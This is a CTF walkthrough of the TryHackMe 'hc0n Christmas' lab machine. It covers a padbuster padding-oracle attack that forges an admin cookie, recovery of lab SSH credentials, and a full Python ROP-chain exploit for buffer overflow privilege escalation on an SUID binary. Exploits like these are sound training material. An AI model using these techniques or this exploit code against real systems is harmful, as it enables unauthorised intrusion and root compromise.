# hc0n Christmas CTF TryHackMe WriteUp  
### Machine IP = 10.112.181.140  
## Before starting I recommend you to solve ***Anonymous Playground TryHackMe CTF*** because this is more advanced version of it. You can get its writeup from there: https://github.com/Ferid-d/TryHackmeWalkthrough/blob/main/Hard/Anonymous_Playground/anonymous_playground.md

Start with port scan:  
```bash   
rustscan -a 10.112.181.140
```
Open Ports: 22, 80, 8080    
When I opened the web-site, I saw a login and register page in there. Lets discover the directories and meanwhile I checked the 8080 port on the url:    
|  
<img width="1048" height="214" alt="image" src="https://github.com/user-attachments/assets/9a5a13af-1755-4a2d-857a-0b643491e846" />    
|  
I tried to decrypt it on CyberChef but got noting as a result.    

After spending so much time, I decided to register on the main web-page (The text on the page has said it as well). Then I decided to create an account and look at the cookie maybe we could find something essential.     
|  
<img width="1506" height="358" alt="image" src="https://github.com/user-attachments/assets/2ff0c74d-6d9a-4887-9b49-d5d87d53119e" />    
|  
My cookie: **%2BURZkN9pCbis0O9pFA7Gi8zwaqdYuLkp**  
There is a big hint. I can see "%2" in my cookie (base64 encryption). Mostly it gives us a hint about **Oracle Padding**. To be sure, I removed the last string of my cookie and click "Enter" and then "Ctrl+R".  
|  
<img width="1241" height="248" alt="image" src="https://github.com/user-attachments/assets/625c3c70-6555-46aa-b7d1-e777237a52e6" />    
|  
Bingooo !!! It means there is Oracle Padding vulnerability. It very complex you can read about it from https://medium.com/@masjadaan/oracle-padding-attack-a61369993c86 but i will try to explain the main concept. When you create a user named "tommy" the website create a cookie for you. But if it is so short, it will ad spaces to your name (which called paddings) and convert the last long version into cookie. The attack is about this paddings. We will use the "padbuster" tool for getting the administrator's cookie. It will take a little bit time because the tool will compare so much things on the cookie. Let's use it:  
```bash
padbuster http://<target IP>/login.php <cookie value> 8 --cookies hcon=<cookie value> --encoding 0 -plaintext user=administratorhc0nwithyhackme
```
You need to write your cookies into there and you are ready to attack.  

`<cookie value> = This is the original encrypted cookie value you have. The tool will modify this value and send it to the server, and try to find the text based on the padding errors returned by the server.`      

`8 = block size`

`--cookies hcon=<cookie value> = Specifies which cookie to check within the request sent to the server. Here, the value of the cookie named hcon is analyzed. ` 

`--encoding 0 = It shows in which format the data is encrypted.  (0 = base64)  `

`-plaintext user=administratorhc0nwithyhackme = It simply says padbuster that 'find the cookie for this user'.  `


```bash
After a long time, padbuster gave me this cookie: u7oWkmr0TrKomnSFpCLrMmqypZ4zLdrKwG7XVt97a%2Bcvankk1KBpOgAAAAAAAAAA
```
Lets became administrator, we just need to paste it in the cookie section from intercept on the web-page and reload the page via Ctrl+R. And YEAHHHH!!!!. We are in!!  
|  
<img width="1404" height="248" alt="image" src="https://github.com/user-attachments/assets/703dedb9-09bd-4283-88c2-d9a9199db915" />     
|  
It will be useful, lets scan for other directories:    

```bash
ffuf -u http://10.112.181.140/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -e .php,.txt,.bak,.zip -fs 0,44 -t 250

/admin
/hide-folders
/robots.txt
```
Let's check them.     
In "**/admin**" page, I saw an .apk file (app-release.apk	2019-12-10 08:06 	1.4M). Lets download it for future discovery.     
In **"/hide-folders"** there was two folder:  
```bash
|--hide-folders  
  |--1  
     | Method not allowed  
  |--2  
     |hola	2019-12-10 07:38 	8.6K  
```
Firstly, I decided to look at the request on burp-suite when I try to open folder number '1'. Because maybe if we change the method, we can get a hint or something important:  
|  
<img width="801" height="306" alt="image" src="https://github.com/user-attachments/assets/477975c4-be68-4c81-850e-f27683f83826" />    
|  
I changed the **"GET"** method to **"OPTIONS"** method and got the hint in response section:      
```bash
hax0r :3 you win firts part of the ssh password Gf7MRr55
```
Hmm, it means that the ssh password is divided into parts. We have already found the first part lets try to complete it.    

----
As you remember there was a file named **"hola"** in the folder number two. Lets open it on terminal.    
```bash
┌──(faridd㉿Ferid)-[~/Downloads/christmas]
└─$ strings hola
      
/lib64/ld-linux-x86-64.so.2
libc.so.6
__isoc99_scanf
puts
__stack_chk_fail
printf
strcmp
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-X
AWAVA
AUATL
[]A\A]A^A_
Enter your username:
Enter your password:
stuxnet
n$@#PDuliL
Welcome, Login Success! this is a second part of ssh password 
Wrong password
```
Woww, we found another part of the password: **n$@#PDuliL**. I combined these two parts:  **Gf7MRr55n$@#PDuliL**. I tried them on the ssh connection for the **"stuxnet"** user, but it didn't work. Let's look at one of the most important folder **"robots.txt"** that I kept for the end.       
|  
<img width="1103" height="298" alt="image" src="https://github.com/user-attachments/assets/945fa055-e374-4332-b8ef-156a579a45bb" />     
|  
```bash
administratorhc0nwithyhackme -- kept it in my mind  
famous group 3301 and secret IV is a hint. I searched about it and learned that "famous group 3301" is cicada 3301. It was one of the most popular cryptograpy puzzle. secret IV means "Initialization Vector". This is a block that is used to make the encryption process random in block cypher algorithm, for (example AES, DES). In this way, when we encrypt the same string multiple it will be different in each time.
```
Okay, we learned that we should decrypt the string in the "iv.png" photo that was obtained from robots.txt file. Lets do it. I used this second photo (alphabet) from reddit:    
|   
<img width="1968" height="371" alt="image" src="https://github.com/user-attachments/assets/fa8d525a-4e54-428d-abd2-75de2d616624" />   
|   
|  
![cicada](https://github.com/user-attachments/assets/bb181c18-ebc1-44e7-ae7b-36c6a2cd2f71)     
|   
The IV translated to **THEIVFORINGEOAEY**.  

----
We founded a string **"RwO9+7tuGJ3nc1cIhN4E31WV/qeYGLURrcS7K+Af85w="** from this user: "http://10.112.181.140:8080/". We learned that It is encrypted by **AES** algorithm. So, lets decrypt it with gathered informations:     
You can use this website: https://www.devglan.com/online-tools/aes-encryption-decryption     
We already have:  

`AES Encrypted Text: RwO9+7tuGJ3nc1cIhN4E31WV/qeYGLURrcS7K+Af85w=`  
`Enter IV Used During Encryption: THEIVFORINGEOAEY`  
`Enter Secret Key used for Encryption: hconkwithyhackme`  
  
```bash
AES Decrypted Output:
user ssh <3 thedarktangent
```

----
## User Flag
We have already figured out the password for ssh connection but didn't know the username. But now, we can access 'thedarktangent' user with this password (Gf7MRr55n$@#PDuliL). Lets do it:  
I easily got the user.txt from there.  

----
## Privilege Escalation  
I saw a file in user's folder.    
```bash
-rwsrwsr-x 1 root           root           8952 Dec 10  2019 hc0n
```
It has also suid bit lets execute and see what it does:    
```bash
thedarktangent@ubuntu:~$ ./hc0n
What will you be having for dinner !! (: 

meat
thedarktangent@ubuntu:~$ 
```
It simply requires us to add an input. The first thing that I thought was buffer overflow. But for now, lets look at its content.  
```bash
┌──(faridd㉿Ferid)-[~/Downloads/christmas]
└─$ strings hc0n

/bin/sh
entree_5
entree_1
entree_3
dessert
entree_4
entree_2
```
They were interesting for me. So, I decided to use nm command also to explore funtions and their adresses:    
```bash
┌──(faridd㉿Ferid)-[~/Downloads/christmas]
└─$ nm hc0n 
0000000000601050 B __bss_start
0000000000601058 b completed.7594
0000000000601038 D __data_start
0000000000601038 W data_start
0000000000400530 t deregister_tm_clones
0000000000601048 D dessert
00000000004005b0 t __do_global_dtors_aux
0000000000600e18 d __do_global_dtors_aux_fini_array_entry
0000000000601040 D __dso_handle
0000000000600e28 d _DYNAMIC
0000000000601050 D _edata
0000000000601060 B _end
00000000004005f6 T entree_1
0000000000400600 T entree_2
0000000000400609 T entree_3
0000000000400612 T entree_4
000000000040061b T entree_5
                 U fgets@@GLIBC_2.2.5
00000000004006e4 T _fini
00000000004005d0 t frame_dummy
0000000000600e10 d __frame_dummy_init_array_entry
0000000000400918 r __FRAME_END__
0000000000601000 d _GLOBAL_OFFSET_TABLE_
                 w __gmon_start__
000000000040072c r __GNU_EH_FRAME_HDR
0000000000400478 T _init
0000000000600e18 d __init_array_end
0000000000600e10 d __init_array_start
00000000004006f0 R _IO_stdin_used
                 w _ITM_deregisterTMCloneTable
                 w _ITM_registerTMCloneTable
0000000000600e20 d __JCR_END__
0000000000600e20 d __JCR_LIST__
                 w _Jv_RegisterClasses
00000000004006e0 T __libc_csu_fini
0000000000400670 T __libc_csu_init
                 U __libc_start_main@@GLIBC_2.2.5
0000000000400624 T main
                 U puts@@GLIBC_2.2.5
0000000000400570 t register_tm_clones
                 U setuid@@GLIBC_2.2.5
0000000000400500 T _start
0000000000601050 B stdin@@GLIBC_2.2.5
0000000000601050 D __TMC_END__
```

`D dessert - means that It is Data Segment. Which means that dessert is a global or static variable that has a value in the program. For example, there can be something on the code like this: char dessert[] = "cake";`    
`T entree_1 - Means that they are Text segment. It includes executable codes - functions. So, our main target is them.`

When we looked at the strings result for this program, we saw **"/bin/sh"** command in there. This means one of the functions execute this command. Don't forget this approach. But now, we need to check buffer overflow. I used this command to print "A" symbol until not to get **segmentation failure**.    
```bash
python3 -c "print('A'*80)" | /home/thedarktangent/hc0n
```
<img width="1091" height="536" alt="image" src="https://github.com/user-attachments/assets/46d1764b-d292-46fe-900d-1844c28390d2" />      
The 54 is buffer's max limit. But what is this buffer?    

### The Structure of Memory (The Stack) and the "Limit"    

When the program runs, it takes a space in RAM called the "Stack". Think of this as three containers stacked on top of each other:    

    Buffer (54 bytes): The space where our input (our name) is stored.  

    Saved RBP (8 bytes): A small "container" that stores the previous version of the program.  

    Return Address (RIP - 8 bytes): This is the "navigation system." When a function finishes its task, it reads this address to know where to go next. Normally, this points back to the safe exit of the program, there is a normal exit address of the program itself.  

The Stack Limit: The programmer allocated exactly 54 bytes for our input. If we write 54 + 8 (RBP) = 62 bytes of data, the stack reaches its limit. After the 63rd byte, anything we write will written directly on top of that critical Return Address (this is called overwriting), the previous normal, stabile exit return address is removed and our new address is written. So, I decided to use this command to break this mechanism and jump the entree_5 function that I consider that will give shell.    
```bash
(python3 -c "print('A'*62 + '\x1b\x06\x40\x00\x00\x00\x00\x00', end='')"; cat) | /home/thedarktangent/hc0n
```
But nooo, it gave segmentation failure again. But why?? Because I made a mistake. A big mistake!!.  

----
### Exploitation Report: hc0n Binary  

Failed Direct Jump (Ret2Win) Attempt  
 
Initially, my analysis suggested a classic Buffer Overflow scenario. I assumed that by overwriting the Return Address (RIP) with the address of a function that provides a shell, the exploit would succeed. Based on the program crashing at the 55th byte, I calculated a 62-byte padding (54-byte buffer + 8-byte Saved RBP). My goal was to jump to the entree_5 (0x40061b) function:  
```bash
(python3 -c "print('A'*62 + '\x1b\x06\x40\x00\x00\x00\x00\x00', end='')"; cat) | ./hc0n
```
However, the program still resulted in a Segmentation Fault. After analyzing the internal code using:     
```bash
objdump -d ./hc0n
```
I identified two primary reasons for this failure:  

### 1. The "Empty Function" Trap  

Unlike the hacktheworld challenge, the **entree_5** function in this binary did not contain a system("/bin/sh") call. Running     
```bash
objdump -d ./hc0n | grep -A 10 "<entree_5>:"

000000000040061b <entree_5>:
  40061b:	55                   	push   %rbp
  40061c:	48 89 e5             	mov    %rsp,%rbp
  40061f:	58                   	pop    %rax
  400620:	c3                   	ret
  400621:	90                   	nop
  400622:	5d                   	pop    %rbp
  400623:	c3                   	ret

0000000000400624 <main>:
  400624:	55                   	push   %rbp
```
revealed that this function only consisted of pop rax and ret instructions. Jumping here was useless because the code required to spawn a shell simply did not exist within the function.  

### 2. Empty RDI Register (Argument Issue)  
   
Even if there were a system() call inside the function, in 64-bit Linux systems, the first argument passed to a function (in our case, /bin/sh) must be stored in the **RDI register**. Jumping directly to a function does not populate this register. Consequently, the processor attempts to execute whatever "garbage" data is in RDI (e.g., my "AAAA" padding) as a **command**, leading to a crash.  

### 3. Transition to ROP (Return-Oriented Programming) Strategy    
   
I realized there was no ready-to-use "win" function within the program. Therefore, I had to build my own exploit chain. Using the **ROPgadget** tool, I began searching for **"gadgets"** (small code snippets) to manually control the registers. My new objective was to issue an **execve (Syscall)** directly to the kernel:  

    RAX: Must be 59 (the syscall ID for execve).

    RDI: Must point to the memory address of the string /bin/sh.

    RSI / RDX: Must be 0.

What are them?  

`1. RAX: This register is used to store the System Call ID (such as 59 for execve) that tells the kernel which function to execute.`

`2. RDI: This register is used to pass the first argument to a function or syscall, which in our case is the memory address of the /bin/sh string.`

`3. RSI: This register is used to pass the second argument, typically set to zero (NULL) when executing a shell to indicate that no environment variables or extra arguments are being passed.`

`4. RDX: This register is used to pass the third argument, which is the environment variables pointer, also set to zero (NULL) for a simple shell execution.`

To pass these parameters to the kernel, I need to find gadgets such as pop rdi ; ret, pop rax ; ret, and pop rsi ; ret in memory. Through these gadgets, I can populate the registers with my desired values.  
The Strategy:  

    Fill the RDI register with the address of the /bin/sh string.

    Fill the RAX register with 59 (the execve syscall ID).

    Set the RSI and RDX registers to 0 (NULL).

    Finally, trigger the syscall instruction to force the kernel to open the shell.

Finding the Gadgets:  

I used the following commands to locate the necessary addresses:  

```bash
ROPgadget --binary ./hc0n | grep "pop rax ; ret"
ROPgadget --binary ./hc0n | grep "pop rsi ; ret"
ROPgadget --binary ./hc0n | grep "pop rdx ; ret"
ROPgadget --binary hc0n --string '/bin/sh'
ROPgadget --binary hc0n --only 'syscall'
```
|  
<img width="923" height="1069" alt="image" src="https://github.com/user-attachments/assets/203f8b0e-e7a4-4d8d-ab12-3fa7918429f4" />    
|  

We saw only one address for '/bin/sh' and 'syscall'. But for others, we can see 4 adressess for each one. But which of them are useful for us? Ofcourse, the clean ones. Others do multiple jobs "mov ebp, esp ; pop rax ; ret". For example, It implement three actions one by one but we dont need additional processess. So, lets use clean ones.    
And there it is! We have successfully found all the required addresses.      
Now, you just need to use my python code to be root.  
```bash  
import subprocess
import struct

# Adresses (That we found)
pop_rax = 0x40061f
pop_rdi = 0x400604
pop_rsi = 0x40060d
pop_rdx = 0x400616
bin_sh = 0x4006f8
syscall = 0x4005fa

# Offset (56 byte - yeah we said 54 is our max input limit, but system needs the bytes to be totally divisiple to 16 so, we need to use 56)
padding = b"A" * 56

def p64(addr):
    return struct.pack("<Q", addr)

# ROP Chain is installed
payload = padding
payload += p64(pop_rax)
payload += p64(59)          # execve sistem call number
payload += p64(pop_rdi)
payload += p64(bin_sh)      # /bin/sh address
payload += p64(pop_rsi)
payload += p64(0)           # RSI = 0
payload += p64(pop_rdx)
payload += p64(0)           # RDX = 0
payload += p64(syscall)     # Shott!

# We run the program and send the payload
with open("payload.bin", "wb") as f:
    f.write(payload)

print("[+] Payload was written into 'payload.bin' file.")
print("[+] Now, run this command on your terminal:")
print("(cat payload.bin; cat) | ./hc0n")
```
|  
<img width="774" height="366" alt="image" src="https://github.com/user-attachments/assets/f3db708c-dd33-4e36-a666-c6b532bef5f2" />    
|  
BINGOO !!! We got the root flag !!    






































